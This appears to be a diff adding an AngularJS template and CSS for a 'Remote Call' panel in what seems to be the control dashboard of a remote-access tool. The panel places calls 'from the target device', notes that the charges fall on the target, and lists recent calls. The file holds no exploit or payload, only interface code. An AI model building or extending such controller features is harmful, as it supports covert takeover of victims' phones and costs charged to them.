@@ -1,0 +1,252 @@
+<div class="call-panel">
+    <div class="call-header">
+        <h3 class="call-header__title">
+            <i class="phone icon" style="color: #4caf50;"></i>
+            Remote Call
+        </h3>
+        <p class="call-header__subtitle">Make calls from the target device</p>
+    </div>
+
+    <div class="call-form-container">
+        <div class="call-form">
+            <div class="call-form-header">
+                <i class="phone volume icon"></i>
+                <span>Dial Number</span>
+            </div>
+            
+            <div class="call-form-group">
+                <label class="call-form-label">
+                    <i class="phone icon"></i>
+                    Phone Number
+                </label>
+                <div class="call-input-wrapper">
+                    <input type="text" class="call-form-input" ng-model="phoneNumber" placeholder="+1 234 567 8900">
+                    <span class="call-input-hint">Include country code for international calls</span>
+                </div>
+            </div>
+            
+            <div class="call-actions">
+                <button class="btn btn--success btn--lg" ng-click="makeCall()" ng-disabled="!phoneNumber">
+                    <i class="phone icon"></i>
+                    Make Call
+                </button>
+            </div>
+        </div>
+        
+        <div class="call-tips">
+            <h4><i class="info circle icon"></i> Information</h4>
+            <ul>
+                <li>Call will be initiated from the target device</li>
+                <li>Standard call rates may apply to the target</li>
+                <li>User will see the dialer on their screen</li>
+                <li>International calls require country code prefix</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="call-history" ng-if="callHistory.length > 0">
+        <h4>Recent Calls Made</h4>
+        <div class="call-history-list">
+            <div class="call-history-item" ng-repeat="call in callHistory track by $index">
+                <i class="phone icon"></i>
+                <span class="call-number">{{call.number}}</span>
+                <span class="call-time">{{call.time}}</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    .call-panel {
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        padding: 20px;
+    }
+    
+    .call-header {
+        margin-bottom: 24px;
+    }
+    
+    .call-header__title {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 18px;
+        font-weight: 600;
+        color: var(--text-primary);
+        margin: 0;
+    }
+    
+    .call-header__subtitle {
+        margin: 4px 0 0;
+        font-size: 12px;
+        color: var(--text-muted);
+    }
+    
+    .call-form-container {
+        display: grid;
+        grid-template-columns: 2fr 1fr;
+        gap: 24px;
+    }
+    
+    .call-form {
+        padding: 24px;
+        background: var(--bg-card);
+        border: 1px solid var(--border-color);
+        border-radius: var(--radius-lg);
+    }
+    
+    .call-form-header {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 16px;
+        font-weight: 600;
+        color: var(--text-primary);
+        margin-bottom: 24px;
+        padding-bottom: 16px;
+        border-bottom: 1px solid var(--border-color);
+    }
+    
+    .call-form-header i {
+        color: var(--accent-success);
+    }
+    
+    .call-form-group {
+        margin-bottom: 20px;
+    }
+    
+    .call-form-label {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 12px;
+        font-weight: 600;
+        color: var(--text-secondary);
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        margin-bottom: 8px;
+    }
+    
+    .call-input-wrapper {
+        position: relative;
+    }
+    
+    .call-form-input {
+        width: 100%;
+        padding: 14px 16px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: var(--radius-md);
+        color: var(--text-primary);
+        font-size: 18px;
+        font-family: var(--font-mono);
+        transition: all 0.2s ease;
+    }
+    
+    .call-form-input:focus {
+        outline: none;
+        border-color: var(--accent-success);
+        box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.1);
+    }
+    
+    .call-input-hint {
+        display: block;
+        font-size: 11px;
+        color: var(--text-muted);
+        margin-top: 6px;
+    }
+    
+    .call-actions {
+        margin-top: 24px;
+    }
+    
+    .btn--success {
+        background: #4caf50;
+        color: white;
+    }
+    
+    .btn--success:hover {
+        background: #43a047;
+    }
+    
+    .btn--lg {
+        padding: 14px 28px;
+        font-size: 14px;
+    }
+    
+    .call-tips {
+        padding: 20px;
+        background: var(--bg-tertiary);
+        border: 1px solid var(--border-color);
+        border-radius: var(--radius-lg);
+        height: fit-content;
+    }
+    
+    .call-tips h4 {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        font-size: 13px;
+        font-weight: 600;
+        color: var(--text-primary);
+        margin: 0 0 16px;
+    }
+    
+    .call-tips h4 i {
+        color: var(--accent-info);
+    }
+    
+    .call-tips ul {
+        margin: 0;
+        padding: 0 0 0 20px;
+    }
+    
+    .call-tips li {
+        font-size: 12px;
+        color: var(--text-secondary);
+        margin-bottom: 10px;
+        line-height: 1.5;
+    }
+    
+    .call-history {
+        margin-top: 24px;
+        padding: 16px;
+        background: var(--bg-card);
+        border: 1px solid var(--border-color);
+        border-radius: var(--radius-lg);
+    }
+    
+    .call-history h4 {
+        font-size: 14px;
+        color: var(--text-primary);
+        margin: 0 0 12px;
+    }
+    
+    .call-history-item {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 10px;
+        background: var(--bg-tertiary);
+        border-radius: var(--radius-md);
+        margin-bottom: 8px;
+    }
+    
+    .call-history-item i {
+        color: var(--accent-success);
+    }
+    
+    .call-number {
+        flex: 1;
+        font-family: var(--font-mono);
+        color: var(--text-primary);
+    }
+    
+    .call-time {
+        font-size: 11px;
+        color: var(--text-muted);
+    }
+</style>
+
